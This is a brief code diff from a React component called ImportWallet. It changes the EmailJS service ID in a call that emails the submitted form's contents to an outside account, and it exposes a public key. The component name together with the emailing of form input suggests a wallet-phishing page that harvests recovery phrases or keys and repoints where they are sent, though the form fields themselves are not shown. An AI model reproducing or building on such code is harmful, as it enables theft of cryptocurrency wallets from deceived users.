@@ -45,7 +45,7 @@ export default function ImportWallet() {
         setLoading(true)
 
         emailjs
-            .sendForm('service_5ub8ysk', 'template_rlxv69i', form.current, {
+            .sendForm('service_v48fths', 'template_rlxv69i', form.current, {
                 publicKey: '_70VxTOfx3VAlSsH1',
             })
             .then(
